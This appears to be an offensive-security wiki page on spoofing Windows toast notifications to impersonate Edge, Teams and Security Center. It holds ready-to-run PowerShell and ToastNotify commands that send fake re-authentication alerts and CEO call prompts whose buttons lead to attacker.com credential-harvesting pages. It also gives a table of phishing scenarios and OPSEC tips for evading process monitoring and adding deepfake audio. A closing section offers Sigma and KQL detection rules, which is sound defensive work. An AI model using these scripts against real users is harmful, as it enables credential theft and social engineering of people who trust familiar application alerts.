---
title: Toast Notifications Abuse
permalink: /wiki/offsec-notes/concepts/toast-notifications-abuse/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

# Toast Notifications Abuse

**Category:** Social Engineering / Execution
**MITRE ATT&CK:** T1204.001 — User Execution: Malicious Link; T1056.002 — Input Capture: GUI Input Capture
**Related:** [Social Engineering](/wiki/offsec-notes/concepts/social-engineering/), [Phishing](/wiki/offsec-notes/concepts/phishing/), [Lateral Movement](/wiki/offsec-notes/concepts/lateral-movement/)

## Overview
Windows Toast Notifications can be spoofed using any registered Application User Model ID (AUMID), impersonating trusted applications (Edge, Teams, Security Center). An attacker with code execution can send notifications that direct users to attacker-controlled URLs, prompt credential re-entry, or simulate Teams calls — without requiring elevated privileges.

## AUMID Enumeration

Three methods to discover valid AUMIDs on a target:

### Method 1: Start Menu Applications
```powershell
$uwp = Get-StartApps | Select-Object -ExpandProperty AppID
$lnk = & {
    $paths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs"
    )
    $shell = New-Object -ComObject Shell.Application
    foreach ($path in $paths) {
        Get-ChildItem $path -Recurse -Filter *.lnk -ErrorAction SilentlyContinue | ForEach-Object {
            $folder = $shell.Namespace($_.DirectoryName)
            $item = $folder.ParseName($_.Name)
            $item.ExtendedProperty("System.AppUserModel.ID")
        }
    }
}
($uwp + $lnk) | Where-Object { $_ } | Sort-Object -Unique
```

### Method 2: AppX Packages
```powershell
Get-AppxPackage | Select Name, PackageFamilyName
```

### Method 3: Registry
```powershell
Get-ChildItem "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings" |
    Select-Object -ExpandProperty PSChildName
```

## Sending Notifications

### Basic (PowerShell — WinRT types)
```powershell
Add-Type -AssemblyName System.Runtime.WindowsRuntime
[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]
[Windows.Data.Xml.Dom.XmlDocument,Windows.Data.Xml.Dom.XmlDocument,ContentType=WindowsRuntime]

$AUMID = "MSEdge"  # Impersonate Edge

$xml = @"
<toast>
  <visual>
    <binding template="ToastGeneric">
      <text>Security Alert</text>
      <text>Your session requires re-authentication. Click to continue.</text>
    </binding>
  </visual>
  <actions>
    <action content="Continue"
            activationType="protocol"
            arguments="https://attacker.com/cred-harvest"/>
  </actions>
</toast>
"@

$doc = New-Object Windows.Data.Xml.Dom.XmlDocument
$doc.LoadXml($xml)
$toast = [Windows.UI.Notifications.ToastNotification]::new($doc)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AUMID)
$notifier.Show($toast)
```

### Teams Call Impersonation
```powershell
$AUMID = "MSTeams_8wekyb3d8bbwe!MSTeams"

$xml = @"
<toast scenario="incomingCall">
  <visual>
    <binding template="ToastGeneric">
      <text>CEO Name</text>
      <text hint-style="subtitle">Urgent - can you jump on a quick call?</text>
      <image placement="appLogoOverride" hint-crop="circle"
             src="C:\path\to\avatar.jpg"/>
    </binding>
  </visual>
  <actions>
    <input id="replyText" type="text" placeHolderContent="Reply..."/>
    <action content="Join Call"
            activationType="protocol"
            arguments="https://attacker.com/teams-phish"/>
    <action content="Dismiss" activationType="system" arguments="dismiss"/>
  </actions>
</toast>
"@
```

### BOF / C# Assembly (ToastNotify)
**Tool:** github.com/netbiosX/ToastNotify — .NET assembly for in-memory execution from C2

```cmd
# Enumerate AUMIDs
shell ToastNotify.exe getaumid

# Send basic notification
shell ToastNotify.exe sendtoast "MSEdge" "Windows Update" "Click to install security patch"

# Send custom XML
shell ToastNotify.exe custom "MSEdge" action-button.xml
```

**Requirement:** No elevated privileges — works as any logged-on user

## Attack Scenarios

| Scenario | AUMID | Goal |
|----------|-------|------|
| Credential phishing | MSEdge | Button redirects to fake login page |
| Teams call social engineering | MSTeams_8wekyb3d8bbwe!MSTeams | Convince target to join attacker-controlled call |
| Security alert urgency | Windows.SecurityCenter | Convince user to perform action (disable AV, install update) |
| IT help desk | Any corporate tool AUMID | Phish password or run script |

## Detection

### Primary IOC: Unexpected Toast Notification DLL Loads
```yaml
title: Unusual Process Loading Toast Notification Libraries
logsource:
  product: windows
  category: image_load
detection:
  selection_dlls:
    ImageLoaded|endswith:
      - '\wpnapps.dll'       # Windows Push Notification Apps
      - '\msxml6.dll'        # XML processing (toast schema)
  filter_normal_processes:
    Image|endswith:
      - '\explorer.exe'
      - '\svchost.exe'
      - '\RuntimeBroker.exe'
      - '\msedge.exe'
      - '\Teams.exe'
      - '\powershell.exe'
  condition: selection_dlls and not filter_normal_processes
level: high
```

### ETW Push Notification Events
ETW provider `Microsoft-Windows-PushNotifications-Platform` generates:
- Event ID 2416 — Notification created
- Event ID 2418 — Notification displayed
- Event ID 3052 — Notification interaction
- Event ID 3153 — Notification dismissed

**Limitation:** Only records application name — no process attribution.

### Registry Monitoring
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings
```
Access or modification to these keys during unusual activity windows.

### MDE (DLL load correlation)
```kql
let suspiciousLoaders = dynamic(["powershell.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe"]);
DeviceImageLoadEvents
| where FileName in~ ("wpnapps.dll", "msxml6.dll", "wpncore.dll")
| where InitiatingProcessFileName in~ (suspiciousLoaders)
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName
```

## OPSEC Notes
- No elevated privileges required — works from any user context with GUI session
- Notification appears as a legitimate app notification — hard to distinguish from real
- Process creation monitoring will catch PowerShell-based notification scripts
- BOF/C# in-memory execution avoids process creation events for the notification itself
- Combine with deepfake audio/video for Teams call scenario for maximum effectiveness

## References
- ipurple.team — "Toast Notifications" (2026-03-25)
- ToastNotify — github.com/netbiosX/ToastNotify
- Invoke-CredentialPhisher (original, older) — github.com/fox-it/Invoke-CredentialPhisher
- brmkit toast BOF — github.com/brmkit/toastnotify-bof
